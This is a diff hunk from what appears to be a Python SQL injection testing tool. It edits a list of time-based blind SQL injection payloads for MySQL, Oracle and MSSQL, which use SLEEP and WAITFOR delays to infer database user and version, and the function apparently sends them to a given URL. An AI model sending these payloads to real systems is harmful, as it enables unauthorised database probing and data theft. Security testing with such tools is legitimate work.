@@ -202,7 +202,7 @@ def timebased(url):
              " and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
              " 'and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
              " DBMS_LOCK.SLEEP(50);",
-             " AND if not(substring((select @version),25,1) < 52)‏waitfor delay  '0:0:50'--"]
+             " AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:50'--"]
     
     for timeler in timesql:
 	try:
